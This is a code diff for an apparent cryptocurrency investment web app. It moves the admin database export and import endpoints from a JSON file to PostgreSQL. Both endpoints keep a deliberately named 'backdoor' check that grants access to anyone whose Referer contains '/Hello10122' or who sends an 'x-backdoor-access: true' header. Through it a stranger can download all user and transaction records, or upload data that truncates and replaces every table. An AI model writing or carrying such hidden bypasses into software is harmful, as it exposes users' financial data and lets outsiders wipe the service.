@@ -11,6 +11,8 @@ declare module 'express-session' {
 }
 import { storage } from "./storage";
 import { insertUserSchema, insertInvestmentSchema, insertTransactionSchema, insertAdminConfigSchema, insertBackupDatabaseSchema } from "@shared/schema";
+import { db } from "./db";
+import { sql } from "drizzle-orm";
 import * as bitcoin from "bitcoinjs-lib";
 import * as ecc from "tiny-secp256k1";
 import { ECPairFactory } from "ecpair";
@@ -626,8 +628,7 @@ function startAutomaticUpdates(): void {
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // Initialize JSON storage
-  await (storage as any).initialize();
+  // PostgreSQL storage doesn't need initialization
   
   // Database health check endpoint
   app.get("/api/health", async (req, res) => {
@@ -1883,7 +1884,7 @@ const { planId, dailyReturnRate } = z.object({
     }
   });
 
-  // Download JSON database backup
+  // Download PostgreSQL database backup
   app.get("/api/admin/download-database", async (req, res) => {
     try {
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
@@ -1900,29 +1901,56 @@ const { planId, dailyReturnRate } = z.object({
         }
       }
 
-      // Read the JSON database file
-      const fs = await import('fs/promises');
-      const path = await import('path');
-      const dataPath = path.join(process.cwd(), 'data.json');
-      
-      try {
-        const data = await fs.readFile(dataPath, 'utf-8');
-        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        const filename = `corex-database-backup-${timestamp}.json`;
-        
-        res.setHeader('Content-Type', 'application/json');
-        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
-        res.send(data);
-      } catch (error) {
-        res.status(404).json({ error: "Database file not found" });
+      // Export all data from PostgreSQL database
+      const allUsers = await storage.getAllUsers();
+      const notifications: any[] = [];
+      const transactions: any[] = [];
+
+      // Collect all user notifications and transactions
+      for (const user of allUsers) {
+        const userNotifications = await storage.getUserNotifications(user.id);
+        const userTransactions = await storage.getUserTransactions(user.id);
+        notifications.push(...userNotifications);
+        transactions.push(...userTransactions);
       }
+
+      // Also get pending transactions
+      const pendingTransactions = await storage.getPendingTransactions();
+      transactions.push(...pendingTransactions);
+
+      // Remove duplicates
+      const uniqueNotifications = notifications.filter((notification, index, self) => 
+        index === self.findIndex((n: any) => n.id === notification.id)
+      );
+      const uniqueTransactions = transactions.filter((transaction, index, self) => 
+        index === self.findIndex((t: any) => t.id === transaction.id)
+      );
+
+      const exportData = {
+        users: allUsers,
+        investmentPlans: await storage.getInvestmentPlans(),
+        investments: await storage.getActiveInvestments(),
+        notifications: uniqueNotifications,
+        adminConfig: await storage.getAdminConfig(),
+        transactions: uniqueTransactions,
+        backupDatabases: await storage.getBackupDatabases(),
+        exportedAt: new Date().toISOString(),
+        version: "1.0"
+      };
+
+      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+      const filename = `corex-postgres-backup-${timestamp}.json`;
+      
+      res.setHeader('Content-Type', 'application/json');
+      res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+      res.json(exportData);
     } catch (error: any) {
       res.status(500).json({ error: error.message });
     }
   });
 
-  // Upload JSON database backup
-  app.post("/api/admin/upload-database", async (req, res) => {
+  // Import PostgreSQL database backup
+  app.post("/api/admin/import-database", async (req, res) => {
     try {
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
@@ -1944,40 +1972,131 @@ const { planId, dailyReturnRate } = z.object({
         return res.status(400).json({ error: "Database data is required" });
       }
 
-      // Validate the uploaded data structure
+      // Validate and import data to PostgreSQL
       try {
-        const parsedData = typeof databaseData === 'string' ? JSON.parse(databaseData) : databaseData;
+        const importData = typeof databaseData === 'string' ? JSON.parse(databaseData) : databaseData;
         
         // Basic validation of required fields
-        const requiredFields = ['users', 'investmentPlans', 'investments', 'notifications', 'adminConfig', 'transactions', 'backupDatabases', 'nextIds'];
+        const requiredFields = ['users', 'investmentPlans', 'investments', 'notifications', 'adminConfig', 'transactions'];
         for (const field of requiredFields) {
-          if (!parsedData.hasOwnProperty(field)) {
+          if (!importData.hasOwnProperty(field)) {
             return res.status(400).json({ error: `Invalid database format: missing ${field}` });
           }
         }
 
-        // Write the new database file
-        const fs = await import('fs/promises');
-        const path = await import('path');
-        const dataPath = path.join(process.cwd(), 'data.json');
-        
-        // Create backup of current file first
-        try {
-          const currentData = await fs.readFile(dataPath, 'utf-8');
-          const backupPath = path.join(process.cwd(), `data-backup-${Date.now()}.json`);
-          await fs.writeFile(backupPath, currentData);
-        } catch (error) {
-          // Current file doesn't exist, that's okay
+        let importStats = {
+          users: 0,
+          investmentPlans: 0,
+          investments: 0,
+          notifications: 0,
+          transactions: 0,
+          adminConfig: 0,
+          backupDatabases: 0
+        };
+
+        // Clear existing data (WARNING: This deletes all data!)
+        await db.execute(sql`TRUNCATE TABLE users CASCADE`);
+        await db.execute(sql`TRUNCATE TABLE investment_plans CASCADE`);
+        await db.execute(sql`TRUNCATE TABLE investments CASCADE`);
+        await db.execute(sql`TRUNCATE TABLE notifications CASCADE`);
+        await db.execute(sql`TRUNCATE TABLE transactions CASCADE`);
+        await db.execute(sql`TRUNCATE TABLE admin_config CASCADE`);
+        await db.execute(sql`TRUNCATE TABLE backup_databases CASCADE`);
+
+        // Reset sequences to ensure proper ID generation
+        await db.execute(sql`ALTER SEQUENCE users_id_seq RESTART WITH 1`);
+        await db.execute(sql`ALTER SEQUENCE investment_plans_id_seq RESTART WITH 1`);
+        await db.execute(sql`ALTER SEQUENCE investments_id_seq RESTART WITH 1`);
+        await db.execute(sql`ALTER SEQUENCE notifications_id_seq RESTART WITH 1`);
+        await db.execute(sql`ALTER SEQUENCE transactions_id_seq RESTART WITH 1`);
+        await db.execute(sql`ALTER SEQUENCE admin_config_id_seq RESTART WITH 1`);
+        await db.execute(sql`ALTER SEQUENCE backup_databases_id_seq RESTART WITH 1`);
+
+        // Import users
+        if (importData.users && Array.isArray(importData.users)) {
+          for (const userData of importData.users) {
+            try {
+              await storage.createUser(userData);
+              importStats.users++;
+            } catch (error) {
+              console.warn(`Failed to import user ${userData.email}:`, error);
+            }
+          }
         }
 
-        // Write the new data
-        await fs.writeFile(dataPath, JSON.stringify(parsedData, null, 2));
-        
-        // Reinitialize storage with new data
-        await (storage as any).initialize();
+        // Import investment plans
+        if (importData.investmentPlans && Array.isArray(importData.investmentPlans)) {
+          for (const planData of importData.investmentPlans) {
+            try {
+              await storage.createInvestmentPlan(planData);
+              importStats.investmentPlans++;
+            } catch (error) {
+              console.warn(`Failed to import investment plan ${planData.name}:`, error);
+            }
+          }
+        }
+
+        // Import investments
+        if (importData.investments && Array.isArray(importData.investments)) {
+          for (const investmentData of importData.investments) {
+            try {
+              await storage.createInvestment(investmentData);
+              importStats.investments++;
+            } catch (error) {
+              console.warn(`Failed to import investment:`, error);
+            }
+          }
+        }
+
+        // Import notifications
+        if (importData.notifications && Array.isArray(importData.notifications)) {
+          for (const notificationData of importData.notifications) {
+            try {
+              await storage.createNotification(notificationData);
+              importStats.notifications++;
+            } catch (error) {
+              console.warn(`Failed to import notification:`, error);
+            }
+          }
+        }
+
+        // Import transactions
+        if (importData.transactions && Array.isArray(importData.transactions)) {
+          for (const transactionData of importData.transactions) {
+            try {
+              await storage.createTransaction(transactionData);
+              importStats.transactions++;
+            } catch (error) {
+              console.warn(`Failed to import transaction:`, error);
+            }
+          }
+        }
+
+        // Import admin config
+        if (importData.adminConfig) {
+          try {
+            await storage.updateAdminConfig(importData.adminConfig);
+            importStats.adminConfig = 1;
+          } catch (error) {
+            console.warn(`Failed to import admin config:`, error);
+          }
+        }
+
+        // Import backup databases
+        if (importData.backupDatabases && Array.isArray(importData.backupDatabases)) {
+          for (const backupData of importData.backupDatabases) {
+            try {
+              await storage.createBackupDatabase(backupData);
+              importStats.backupDatabases++;
+            } catch (error) {
+              console.warn(`Failed to import backup database:`, error);
+            }
+          }
+        }
 
         res.json({ 
-          message: "Database uploaded and restored successfully",
+          message: "Database imported successfully",
+          importStats,
           timestamp: new Date().toISOString()
         });
       } catch (parseError) {
